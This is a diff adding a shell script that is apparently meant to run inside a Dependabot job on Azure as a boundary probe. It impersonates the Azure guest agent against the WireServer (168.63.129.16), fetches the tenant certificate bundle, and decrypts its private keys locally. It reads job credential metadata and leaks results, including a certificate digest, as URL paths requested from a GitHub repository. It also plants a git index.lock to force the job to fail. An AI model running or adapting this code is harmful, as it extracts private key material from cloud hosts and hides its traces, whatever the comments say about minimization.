@@ -1,0 +1,229 @@
+#!/bin/sh
+# Data-minimized Azure WireServer certificate probe for an owned Dependabot lab.
+# GET-only. It never prints response bodies, certificate values, private keys,
+# instance identifiers, or internal URLs, and deletes all temporary material.
+set +e
+
+api_base="https://api.github.com"
+source_repo="fazemike1-lab/dbot-rce-source"
+tmp_dir="/tmp/dbot-wire-cert-$$"
+umask 077
+mkdir -p "$tmp_dir" || exit 1
+
+cleanup() {
+  rm -f "$tmp_dir"/* 2>/dev/null
+  rmdir "$tmp_dir" 2>/dev/null
+}
+trap cleanup EXIT HUP INT TERM
+
+emit_marker() {
+  marker="$1"
+  curl -ksS --max-time 5 -o /dev/null \
+    "$api_base/repos/$source_repo/contents/$marker" 2>/dev/null
+}
+
+# Prove that the host came from an anonymous registry entry, not a secret.
+anon_summary="unknown 0 0"
+if [ -n "${DEPENDABOT_JOB_PATH:-}" ] && [ -r "$DEPENDABOT_JOB_PATH" ]; then
+  anon_summary="$(ruby -rjson -ruri -e '
+    begin
+      parsed = JSON.parse(File.binread(ARGV[0]))
+      job = parsed["job"] || parsed.dig("data", "attributes") || {}
+      entries = job["credentials-metadata"] || job["credentials_metadata"] || []
+      matching = entries.select do |entry|
+        value = entry["url"] || entry["registry"] || entry["index-url"] || entry["host"]
+        begin
+          value = "//#{value}" unless value.to_s.include?("://")
+          URI.parse(value.to_s).host == "168.63.129.16"
+        rescue StandardError
+          false
+        end
+      end
+      secret_keys = %w[token password auth-key key client-secret]
+      secret_count = matching.sum { |entry| secret_keys.count { |key| !entry[key].to_s.empty? && entry[key].to_s != ":" } }
+      experiments = job["experiments"] || {}
+      puts [experiments["proxy-egress-enforce"] == true ? 1 : 0, matching.length, secret_count].join(" ")
+    rescue StandardError
+      puts "unknown 0 0"
+    end
+  ' "$DEPENDABOT_JOB_PATH" 2>/dev/null)"
+fi
+set -- ${anon_summary:-unknown 0 0}
+egress_enforce="$1"
+registry_count="$2"
+registry_secret_count="$3"
+printf 'DBOT_WIRECERT_POLICY EGRESS_ENFORCE=%s WIRE_REGISTRY_COUNT=%s REGISTRY_SECRET_FIELDS=%s\n' \
+  "$egress_enforce" "$registry_count" "$registry_secret_count" >&2
+emit_marker ".dbot-wirecert-POLICY-e${egress_enforce}-r${registry_count}-s${registry_secret_count}"
+
+# Negative egress control.
+control_body="$tmp_dir/control.bin"
+control_code="$(curl -ksS --connect-timeout 2 --max-time 5 -o "$control_body" \
+  -w '%{http_code}' 'http://dbot-egress-control.invalid:2375/_ping' 2>/dev/null)"
+control_size="$(wc -c < "$control_body" 2>/dev/null | tr -d ' ')"
+printf 'DBOT_WIRECERT_CONTROL STATUS=%s SIZE=%s\n' "${control_code:-curl_error}" "${control_size:-0}" >&2
+emit_marker ".dbot-wirecert-CONTROL-s${control_code:-x}-n${control_size:-0}"
+rm -f "$control_body"
+
+# Fetch GoalState and extract only the certificate URL into a permission-0600
+# temporary file. The URL itself is never logged.
+goal_body="$tmp_dir/goalstate.xml"
+goal_code="$(curl -ksS --connect-timeout 2 --max-time 8 --max-filesize 262144 \
+  -H 'Metadata:true' \
+  -H 'x-ms-version: 2012-11-30' \
+  -H 'x-ms-agent-name: DependabotBoundaryCanary' \
+  -o "$goal_body" -w '%{http_code}' \
+  'http://168.63.129.16/machine?comp=goalstate' 2>/dev/null)"
+goal_size="$(wc -c < "$goal_body" 2>/dev/null | tr -d ' ')"
+cert_url_file="$tmp_dir/cert-url"
+goal_shape="$(ruby -rrexml/document -e '
+  begin
+    doc = REXML::Document.new(File.binread(ARGV[0]))
+    element = REXML::XPath.first(doc, "//Certificates")
+    url = element&.text.to_s
+    File.binwrite(ARGV[1], url) unless url.empty?
+    puts [url.empty? ? 0 : 1, REXML::XPath.match(doc, "//RoleInstance").length].join(" ")
+  rescue StandardError
+    puts "0 0"
+  end
+' "$goal_body" "$cert_url_file" 2>/dev/null)"
+set -- ${goal_shape:-0 0}
+cert_url_present="$1"
+role_instance_count="$2"
+printf 'DBOT_WIRECERT_GOAL STATUS=%s SIZE=%s CERT_URL_PRESENT=%s ROLE_INSTANCE_COUNT=%s\n' \
+  "${goal_code:-curl_error}" "${goal_size:-0}" "$cert_url_present" "$role_instance_count" >&2
+emit_marker ".dbot-wirecert-GOAL-s${goal_code:-x}-n${goal_size:-0}-c${cert_url_present}-ri${role_instance_count}"
+
+if [ "$goal_code" != "200" ] || [ "$cert_url_present" != "1" ] || [ ! -s "$cert_url_file" ]; then
+  exit 1
+fi
+
+# Accept only the exact read-only WireServer certificates route announced by
+# this GoalState. No redirects and no state-changing methods are used.
+cert_url="$(cat "$cert_url_file" 2>/dev/null)"
+WIRE_CERT_URL="$cert_url" ruby -ruri -e '
+  begin
+    uri = URI.parse(ENV.fetch("WIRE_CERT_URL"))
+    valid = uri.scheme == "http" && uri.host == "168.63.129.16" && uri.port == 80 &&
+      uri.path.start_with?("/machine/") && uri.query.to_s.split("&").include?("comp=certificates") &&
+      uri.userinfo.nil? && uri.fragment.nil?
+    exit(valid ? 0 : 1)
+  rescue StandardError
+    exit 1
+  end
+' >/dev/null 2>&1
+if [ $? -ne 0 ]; then
+  printf 'DBOT_WIRECERT_CERTS STATUS=skipped_invalid_internal_url SIZE=0 FORMAT_OK=0 DATA_PRESENT=0\n' >&2
+  emit_marker '.dbot-wirecert-CERTS-SKIPPED'
+  exit 1
+fi
+
+# Follow the official WALinuxAgent transport-certificate flow: generate an
+# ephemeral keypair and send only its public certificate in the request header.
+transport_key="$tmp_dir/transport.key"
+transport_crt="$tmp_dir/transport.crt"
+openssl req -x509 -nodes -subj '/CN=LinuxTransport' -days 1 -newkey rsa:2048 \
+  -keyout "$transport_key" -out "$transport_crt" >/dev/null 2>&1
+keygen_rc=$?
+cert_b64="$(ruby -e 'data=File.binread(ARGV[0]); data=data.gsub(/-----[^-]+-----/, "").gsub(/\s+/, ""); print data' "$transport_crt" 2>/dev/null)"
+
+cert_body="$tmp_dir/certificates.xml"
+if [ "$keygen_rc" -eq 0 ] && [ -n "$cert_b64" ]; then
+  cert_code="$(curl -ksS --connect-timeout 2 --max-time 10 --max-filesize 1048576 \
+    -H 'x-ms-agent-name: WALinuxAgent' \
+    -H 'x-ms-version: 2012-11-30' \
+    -H 'x-ms-cipher-name: AES128_CBC' \
+    -H "x-ms-guest-agent-public-x509-cert: $cert_b64" \
+    -o "$cert_body" -w '%{http_code}' "$cert_url" 2>/dev/null)"
+else
+  cert_code="keygen_error"
+fi
+unset cert_b64 cert_url WIRE_CERT_URL
+
+cert_size="$(wc -c < "$cert_body" 2>/dev/null | tr -d ' ')"
+cert_der="$tmp_dir/certificates.der"
+cert_shape="$(ruby -rrexml/document -rbase64 -e '
+  begin
+    doc = REXML::Document.new(File.binread(ARGV[0]))
+    format = REXML::XPath.first(doc, "//Format")&.text.to_s
+    data = REXML::XPath.first(doc, "//Data")&.text.to_s
+    File.binwrite(ARGV[1], Base64.decode64(data)) unless data.empty?
+    puts [format == "Pkcs7BlobWithPfxContents" ? 1 : 0, data.empty? ? 0 : 1].join(" ")
+  rescue StandardError
+    puts "0 0"
+  end
+' "$cert_body" "$cert_der" 2>/dev/null)"
+set -- ${cert_shape:-0 0}
+format_ok="$1"
+data_present="$2"
+printf 'DBOT_WIRECERT_CERTS STATUS=%s SIZE=%s FORMAT_OK=%s DATA_PRESENT=%s\n' \
+  "${cert_code:-curl_error}" "${cert_size:-0}" "$format_ok" "$data_present" >&2
+emit_marker ".dbot-wirecert-CERTS-s${cert_code:-x}-n${cert_size:-0}-f${format_ok}-d${data_present}"
+
+# Decrypt locally only when the response has the exact expected structure.
+# The resulting private material never leaves the temp directory; only block
+# counts are emitted, then the trap deletes all files.
+decrypt_rc=99
+convert_rc=99
+private_key_count=0
+certificate_count=0
+public_cert_sha16=none
+key_cert_match=0
+self_signed=0
+key_bits=0
+if [ "$cert_code" = "200" ] && [ "$format_ok" = "1" ] && [ "$data_present" = "1" ] && [ -s "$cert_der" ]; then
+  cert_pfx="$tmp_dir/certificates.pfx"
+  cert_pem="$tmp_dir/certificates.pem"
+  openssl cms -decrypt -inform DER -in "$cert_der" -inkey "$transport_key" \
+    -recip "$transport_crt" -out "$cert_pfx" >/dev/null 2>&1
+  decrypt_rc=$?
+  if [ "$decrypt_rc" -eq 0 ]; then
+    openssl pkcs12 -nodes -password pass: -in "$cert_pfx" -out "$cert_pem" -nomacver >/dev/null 2>&1
+    convert_rc=$?
+    if [ "$convert_rc" -ne 0 ]; then
+      openssl pkcs12 -nodes -password pass: -in "$cert_pfx" -out "$cert_pem" >/dev/null 2>&1
+      convert_rc=$?
+    fi
+  fi
+  if [ "$convert_rc" -eq 0 ] && [ -r "$cert_pem" ]; then
+    private_key_count="$(grep -Ec '^-----BEGIN .*PRIVATE KEY-----$' "$cert_pem" 2>/dev/null)"
+    certificate_count="$(grep -c '^-----BEGIN CERTIFICATE-----$' "$cert_pem" 2>/dev/null)"
+
+    # Emit only non-secret, minimized properties. The truncated digest lets us
+    # tell whether Azure reuses the same tenant certificate across isolated
+    # jobs without exposing its identity fields or key material.
+    tenant_crt="$tmp_dir/tenant.crt"
+    tenant_key="$tmp_dir/tenant.key"
+    cert_pub="$tmp_dir/cert.pub"
+    key_pub="$tmp_dir/key.pub"
+    if openssl x509 -in "$cert_pem" -out "$tenant_crt" >/dev/null 2>&1 &&
+       openssl pkey -in "$cert_pem" -out "$tenant_key" >/dev/null 2>&1; then
+      public_cert_sha16="$(openssl x509 -in "$tenant_crt" -outform DER 2>/dev/null |
+        openssl dgst -sha256 -r 2>/dev/null | awk '{print substr($1,1,16)}')"
+      openssl x509 -in "$tenant_crt" -pubkey -noout > "$cert_pub" 2>/dev/null
+      openssl pkey -in "$tenant_key" -pubout > "$key_pub" 2>/dev/null
+      if [ -s "$cert_pub" ] && [ -s "$key_pub" ] && cmp -s "$cert_pub" "$key_pub"; then
+        key_cert_match=1
+      fi
+      if openssl verify -CAfile "$tenant_crt" "$tenant_crt" >/dev/null 2>&1; then
+        self_signed=1
+      fi
+      key_bits="$(openssl pkey -in "$tenant_key" -text -noout 2>/dev/null |
+        sed -n 's/.*Private-Key: (\([0-9][0-9]*\) bit.*/\1/p' | head -n 1)"
+    fi
+  fi
+fi
+
+printf 'DBOT_WIRECERT_DECRYPT DECRYPT_RC=%s CONVERT_RC=%s PRIVATE_KEY_COUNT=%s CERTIFICATE_COUNT=%s\n' \
+  "$decrypt_rc" "$convert_rc" "${private_key_count:-0}" "${certificate_count:-0}" >&2
+emit_marker ".dbot-wirecert-DECRYPT-dr${decrypt_rc}-cr${convert_rc}-pk${private_key_count:-0}-c${certificate_count:-0}"
+printf 'DBOT_WIRECERT_META CERT_SHA16=%s KEY_CERT_MATCH=%s SELF_SIGNED=%s KEY_BITS=%s\n' \
+  "${public_cert_sha16:-none}" "$key_cert_match" "$self_signed" "${key_bits:-0}" >&2
+emit_marker ".dbot-wirecert-META-h${public_cert_sha16:-none}-m${key_cert_match}-ss${self_signed}-b${key_bits:-0}"
+
+# Keep the minimized markers in the failed Dependabot log while leaving no
+# repository change or successful malicious commit behind.
+git reset -q HEAD -- . 2>/dev/null
+index_lock="$(git rev-parse --git-path index.lock 2>/dev/null)"
+[ -n "$index_lock" ] && : > "$index_lock" 2>/dev/null
+exit 1
